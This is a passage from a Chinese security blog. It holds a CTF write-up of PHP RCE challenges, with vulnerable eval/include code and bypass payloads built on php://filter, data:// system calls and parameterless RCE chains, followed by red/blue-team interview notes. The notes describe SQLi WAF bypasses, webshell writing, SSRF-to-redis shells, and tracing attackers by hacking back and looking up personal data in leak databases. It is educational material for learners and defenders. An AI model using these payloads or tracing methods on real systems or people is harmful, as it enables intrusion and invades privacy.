class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Sured4rag0n/Cartographic-bed/main/PicGo202209221202260.png"></p><p>base64解码出啦flag</p><h1 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 04:21:29</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多过滤一个:号，还是可以使用上一题的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Sured4rag0n/Cartographic-bed/main/PicGo202209221207726.png"></p><p><img src="https://raw.githubusercontent.com/Sured4rag0n/Cartographic-bed/main/PicGo202209221209469.png"></p><h1 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 04:21:23</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多过滤一个&lt;号和一个&#x3D;号，不过没有影响，继续使用前面的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Sured4rag0n/Cartographic-bed/main/PicGo202209221211196.png"></p><h1 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 04:21:16</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次增加过滤数字，但还是没有影响，继续使用前面payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Sured4rag0n/Cartographic-bed/main/PicGo202209221220343.png"></p><h1 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 05:18:55</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c);</span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题里边有include语句了然后也过滤了flag，利用伪协议data方法绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:text/plain,&lt;?=system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Sured4rag0n/Cartographic-bed/main/PicGo202209221222677.png"></p><h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 05:23:36</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;</span><br><span class="line">        include($c);</span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里过滤了php和file，继续使用data短标签，还是上边的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:text/plain,&lt;?=system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Sured4rag0n/Cartographic-bed/main/PicGo202209221222677.png"></p><h1 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 06:13:21</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次减少了过滤，但是会再后面加上.php的后缀，然而我们前面的payload结尾是有一个?&gt;进行了标签闭合，所以?&gt;.php没有影响，继续使用前面payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:text/plain,&lt;?=system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Sured4rag0n/Cartographic-bed/main/PicGo202209221228993.png"></p><h1 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 06:03:36</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次过滤了一些符号，这里回到eval语句执行命令，但过滤了许多东西，没有过滤掉英文的()，那我们使用无参数的rce进行构造读取文件</p><blockquote><p>print_r(scandir(‘.’)); 查看当前目录下的所有文件名</p><p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。</p><p>current() 函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名</p></blockquote><p>先打印出当前目录下的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Sured4rag0n/Cartographic-bed/main/PicGo202209221229184.png"></p><p>读取目录文件后，发现输出的是数组，而文件名是数组中的值，下一步我们需要取出想要读取文件的数组</p><blockquote><p>each() 返回数组中当前的键&#x2F;值对并将数组指针向前移动一步<br>end() 将数组的内部指针指向最后一个单元<br>next() 将数组中的内部指针向前移动一位<br>prev() 将数组中的内部指针倒回一位<br>array_reverse() 以相反的元素顺序返回数组</p></blockquote><p>科普完成，观察到flag.php在倒数第二位，开始构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Sured4rag0n/Cartographic-bed/main/PicGo202209221232482.png"></p>]]></content>
      
      
      <categories>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNVD证书(CNVD-YCGS-202207011631)</title>
      <link href="/2022/07/22/%E5%93%88%E5%93%88%E5%93%88/"/>
      <url>/2022/07/22/%E5%93%88%E5%93%88%E5%93%88/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://raw.githubusercontent.com/Sured4rag0n/Cartographic-bed/main/PicGo202209260930025.png"></p>]]></content>
      
      
      <categories>
          
          <category> CNVD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CNVD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HVV面试题</title>
      <link href="/2022/06/21/hw%E9%9D%A2%E7%BB%8F/"/>
      <url>/2022/06/21/hw%E9%9D%A2%E7%BB%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="HW经验部分"><a href="#HW经验部分" class="headerlink" title="HW经验部分"></a>HW经验部分</h1><h2 id="钓鱼邮件如何伪造？"><a href="#钓鱼邮件如何伪造？" class="headerlink" title="钓鱼邮件如何伪造？"></a>钓鱼邮件如何伪造？</h2><p>一般都是找目标会相信的一些网站的邮件模板，骗取目标信任。</p><h3 id="如何防御？"><a href="#如何防御？" class="headerlink" title="如何防御？"></a>如何防御？</h3><p>防御的话就不要轻易相信，最好去网站找管理员确认，将文件丢到虚拟机或者沙箱中运行</p><h2 id="hw期间突然出了一个day？"><a href="#hw期间突然出了一个day？" class="headerlink" title="hw期间突然出了一个day？"></a>hw期间突然出了一个day？</h2><p>这个要看是什么day  比如是最近出的一个锐捷路由的0ay的话 如果我是防守方 一般他会有路由后台的白名单处理   我会设置一下只有指定ip才可以登录 然后对漏洞进行修复  这是没被打过的情况 如果被打过了  就只能按照应急响应方式处理  检测木马 删除后门啊这种</p><p>0day已经爆出来了 exp poc 很成熟了</p><p>\1. 收集提交得分</p><p>\2. 避免0day打到自己 ，如果有安全设备，自己写规则用于识别0day并且阻断</p><h2 id="什么是蜜罐"><a href="#什么是蜜罐" class="headerlink" title="什么是蜜罐"></a>什么是蜜罐</h2><p>蜜罐：就是一台全是漏洞的靶机，吸引黑客来进攻蜜罐系统，然后掌握黑客的信息，利用蜜罐可以做到：获取攻击者的P（真实IP，代理IP等）、ID、操作系统、设备信息等，也可通过诱饵进行钓鱼反制</p><h2 id="接触过蜜罐吗？"><a href="#接触过蜜罐吗？" class="headerlink" title="接触过蜜罐吗？"></a>接触过蜜罐吗？</h2><p>有 自己搭建过 用github开源的搭建过  名字叫 hfish   主动诱导型开源蜜罐框架系统  记录黑客攻击手段，实现防护自主化</p><p>蜜罐常见形式可以直观的分为web页面型，命令行型，windows型等<br>web页面：例如weblogic、phpmyadmin、crm等，攻击者可进行弱口令登陆，暴力破解，历史漏洞，后台shell等，蜜罐页面中会插入溯源jsonp，例如百度、163、腾讯、新浪的对攻击者的ID进行溯源蓝队也可以根据这个思路自己收集一些jsonp用于自制蜜罐中。web型蜜罐的识别方法为查看数据包，如果数据包中出现了很多的不属于该网站的js信息，很大程度上为蜜罐。另外溯源js经常会在页面上产生一个细小的像素点，通过像素点也可以来判断是否踩到了蜜罐<br>命令行：例如redis（最常见也是攻击者最容易踩到的）、ssh等，此类获取到的信息偏向于IP，对于ID有一定难度<br>windows：例如win7，xp等，其中包含一些历史漏洞，可以对攻击者进行反制<br>现在的蜜罐除了上述的基本功能外，都有一些自己的花样，例如诱饵（邮件诱饵，github等），反制诱饵等。<br>这里的反制诱可以理解为红队的钓鱼文件，例如在某网站下载链接嵌入一个反制exe，当攻击者点开始便可获得攻击者电脑权限，利用查看文件等操作溯源，从而达到反制的目的</p><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>阿里云网站接入流程您在WAF控制台添加需要防护的网站域名后，通过修改该域名的DNS解析设置，将网站流量解析到WAF，使访问网站的流量经过WAF并受到WAF的防护。</p><h2 id="有没有溯源经历"><a href="#有没有溯源经历" class="headerlink" title="有没有溯源经历"></a>有没有溯源经历</h2><p>案例1：监测组上报的一条可疑IP，搜了下最近的攻击记录发现不是很平凡，但是很稳定的一会来一次，就先通过微步分析了下恶意傀儡机，估计是肉鸡一类的，nmap扫了一下6379开放，试了下未授权，redis直接连上了怪不得被抓肉鸡，直接就写入ssh公钥文件来连了，使用netstat看了下，除了自己之外就一个外连IP感觉就是目标了，不过保险起见话是去&#x2F;var&#x2F;log&#x2F;wtmp看了下日志，发现刚才的IP连接过多次，实锤了，whois查询下IP，成功关联到邮箱，搜了下QQ，里面写了某省的市区，但是没有手机号，就丢去REG007查了下没啥东西，就把邮箱丢去社工库查到了手机号和姓名，通过手机号搜到了微信，然后通过圈子里朋友找了下，没找到熟人，然后就把这些信息丢去谷歌搜了下，找到了博客和一些个人介绍，到这里就差不多写报告提交了</p><p>栗子2：监测组上报来的一条可疑IP，有多次恶意行为，同时蜜罐设备也捕获到了恶意攻击，不过是一个域名，当时就先给定研判结果，对IP和域名进行了封堵，然后通过微步在线查询，发现这个域名被很多人标记，也有明显的特征，通过IP发查发现之前的监测2上报IP为代理IP，通过域名解析得到了真实IP，然后用nmap扫了下ip端口，发现开放了80、443、3389、8080这些端口，分别进行访问，并进行目录扫描，发现8080端口为nps代理的web管理访问端口，使用默认的用户名和密码登陆失败，但3306存在弱口令，dba权限就直接拿了webshell，连接后查看用户情况，发现存在目标人物拼音的用户名，和一些py脚本，copy回来后，在注释里发现了疑似攻击者的网名、qq邮箱等信息，然后查询Q绑，获得了手机号，再通过支付宝获取了真实姓名，后面通过手头的信息去谷歌和百度搜索了一下，查到他的一些帖子和文章，还有src的个人简介等，又通过圈子里朋友确定了他所在的公司，最后就是写报告了</p><p>参考文章：<a href="https://xz.aliyun.com/t/9316">https://xz.aliyun.com/t/9316</a></p><h2 id="获得攻击者的ip后如何溯源，获取攻击者信息"><a href="#获得攻击者的ip后如何溯源，获取攻击者信息" class="headerlink" title="获得攻击者的ip后如何溯源，获取攻击者信息"></a>获得攻击者的ip后如何溯源，获取攻击者信息</h2><p>先对IP进行定位，扫描一下，看看有哪些端口和服务，如果能找到机房可以尝试联系客服机房社工一下，然后就是根据开放端口和服务来寻找相关漏洞，查看下有没有绑定域名，查询下能否拿到邮箱等信息，然后去社工库查一下，看看能不能查到攻击者的一些信息，再根据这些信息搜微信或者通过圈内一些朋友来获取目标更多信息</p><h2 id="如何反查真实ip"><a href="#如何反查真实ip" class="headerlink" title="如何反查真实ip"></a>如何反查真实ip</h2><p>fofa 互联网搜索引擎  </p><p>\1. 渗透手段  例如说ssrf 使用dnslog 就可以获取真实ip</p><p>\2. 查找历史解析  </p><p>\3. cloudflare github 可以获取真实IP</p><p>4.fofa cert &#x3D;”xxxx.com”</p><p>5.http 如果 一个网站有icon 可以根据icon hash 来查找真实IP</p><p>\6. 前台不一样 css也不一样 可以根据CSS的信息 去fofa上找body对应的信息</p><p>7.多地ping  这个 可以查询一个url 是否是cdn 或者是否是真实IP  多地ping 只能判断是否绑定多IP  其中多IP并不一定是CDN 也有可能是服务器负载均衡  </p><p>\8. nslookup 查找ns的记录 是否为cdn的记录  </p><p>\9. whois 查询 域名的DNS服务器 是否是cdn的DNS服务器</p><p>10.如果网站有邮件功能，有可能邮件发送的地址为网站真实IP地址</p><p>11 子域名绑定 测试子域可能回源</p><hr><h1 id="web方面"><a href="#web方面" class="headerlink" title="web方面"></a>web方面</h1><h2 id="disable-functions-绕过"><a href="#disable-functions-绕过" class="headerlink" title="disable_functions 绕过"></a>disable_functions 绕过</h2><ol><li><p>黑名单总有漏网之鱼，多尝试一些函数</p></li><li><p>LD_PRELOAD：原理就是劫持系统函数，使程序加载恶意动态链接库文件，从而执行系统命令等敏感操作</p></li><li><p>lmageMagick：利用lmageMagick命令执行漏洞（CVE-2016-3714）</p></li><li><p>Windows系统组件COM绕过</p></li><li><p>PHP 7.4 FFI绕过</p></li><li><p>利用Bash破壳（CVE-2014-6271）漏洞绕过</p></li><li><p>利用imap_open()绕过（CVE-2018-19518）</p></li><li><p>利用pcntl插件绕过</p></li></ol><h2 id="拿到webshell不出网情况下怎么办"><a href="#拿到webshell不出网情况下怎么办" class="headerlink" title="拿到webshell不出网情况下怎么办"></a>拿到webshell不出网情况下怎么办</h2><p>reg上传去正向连接。或探测出网协议，如dns，icmp</p><h2 id="SSRF的具体利用方式？"><a href="#SSRF的具体利用方式？" class="headerlink" title="SSRF的具体利用方式？"></a>SSRF的具体利用方式？</h2><p>具体操作需要查看支持的协议，file协议查看文件、dict协议探测端口、ophergopher协议支持GET&amp;POST请求，同时在攻击内网ftp、redis、telnet、Memcache上有极大作用利用gopher协议访问redis反弹shell</p><h2 id="一个登陆页面有哪些漏洞"><a href="#一个登陆页面有哪些漏洞" class="headerlink" title="一个登陆页面有哪些漏洞"></a>一个登陆页面有哪些漏洞</h2><p>弱口令，用户名穷举、密码可爆破、验证码绕过、可爆破、可重复利用等，任意密码重置、任意用户注册、SQL注入、一些框架或CMD漏洞，比如shiro反序列化这些，未授权、修改响应绕过登录、xss</p><p>暂时想到的就这些了，应该是比较全的了</p><h2 id="sqlmap部分"><a href="#sqlmap部分" class="headerlink" title="sqlmap部分"></a>sqlmap部分</h2><h3 id="sqlmap的–level和–risk的区别"><a href="#sqlmap的–level和–risk的区别" class="headerlink" title="sqlmap的–level和–risk的区别"></a>sqlmap的–level和–risk的区别</h3><p>level级别越高发送的请求越多，并且在level3以上时会尝试对referer注入。</p><p>而risk则是风险系数，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的QL注入测试。在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险</p><h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>floor()、extractvalue()、updatexml()、geometrycollection()、exp()</p><h2 id="SQL注入bypass-waf的方法"><a href="#SQL注入bypass-waf的方法" class="headerlink" title="SQL注入bypass waf的方法"></a>SQL注入bypass waf的方法</h2><p>大小写绕过、16进制绕过等方法可以绕过老waf  </p><p>like代替&#x3D; 、空格用%20 %09 %0a 、&#x2F;**&#x2F;注释、脏数据、罕见函数、参数污染、url编码、unicode编码(空格&#x3D;&gt; %u0020 %uff00、左括号&#x3D;&gt; %u0028 %uff08、左括号&#x3D;&gt; %u0028 %uff08) </p><p>%1e在mssql中为空白符，使用%1e代替空格可以绕过部分waf检测</p><p>利用mssql的特性 %1e替换进行绕过</p><h2 id="mysql5-0以下和5-1以上注入什么区别"><a href="#mysql5-0以下和5-1以上注入什么区别" class="headerlink" title="mysql5.0以下和5.1以上注入什么区别"></a>mysql5.0以下和5.1以上注入什么区别</h2><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p><p>5.0以下是多用户单操作，5.0以上是多用户多操做。</p><h2 id="mysql写shell的条件"><a href="#mysql写shell的条件" class="headerlink" title="mysql写shell的条件"></a>mysql写shell的条件</h2><p>1、网站可访问路径的绝对路径</p><p>2、secure_file_priv 的值非NULL或包含了导出的绝对路径</p><p>secure_file_priv的值在mysql配置文件my.ini中设置，这个参数用来限制数据导入导出<br>Mysql&gt;&#x3D;5.5.53 默认为NULL，即默认禁止导入导出<br>Mysql&lt;5.5.53 默认为空，即默认无限制</p><p>3、mysql服务有对网站可访问路径的写权限</p><p>4、mysql连接用户有FILE权限&#x2F;ROOT用户或ROOT权限</p><p>5、GPC关闭&#x2F;&#x2F;未对闭合用的引号转义</p><p>outfile 和 dumpfile的路径不支持hex，必须有引号包裹</p><h2 id="mysql日志写shell"><a href="#mysql日志写shell" class="headerlink" title="mysql日志写shell"></a>mysql日志写shell</h2><p>与导出函数写Shell相比，规避了 secure_file_priv 的限制</p><p>1.网站可访问路径的绝对路径</p><p>2.mysql服务有对网站可访问路径的写权限</p><p>3.mysql连接用户有权限开启日志记录和更换日志路径&#x2F;ROOT权限</p><p>4.GPC关闭&#x2F;未对闭合用的引号转义<br>    虽然日志路径可以hex编码，但被记入日志的查询语句中的shell内容需要引号包裹，加<code>\</code>后传到数据库执行会报错，无法记录进日志</p><h2 id="获取网站根路径"><a href="#获取网站根路径" class="headerlink" title="获取网站根路径"></a>获取网站根路径</h2><p>1、输入错误的信息使其报错</p><p>2、寻找测试文件获取路径</p><p>3、寻找phpinfo文件</p><h2 id="SQL注入原理类型"><a href="#SQL注入原理类型" class="headerlink" title="SQL注入原理类型"></a>SQL注入原理类型</h2><p>原理: Web应用程序对于用户输入的数据和合法性没有严谨的判断，前端用户的输入直接传输给后端，攻击者通过构造不同的参数，形成不同的SQL语句来实现对数据库的任意操作</p><p>类型: Union注入，Boolean注入，报错注入攻击，时间注入攻击,堆叠注入dnslog注入</p><h2 id="top-10"><a href="#top-10" class="headerlink" title="top 10"></a>top 10</h2><ul><li><p><a href="https://blog.csdn.net/yxiangfei/article/details/109234147#1_Top1_18">1. Top1-注入</a></p></li><li><p><a 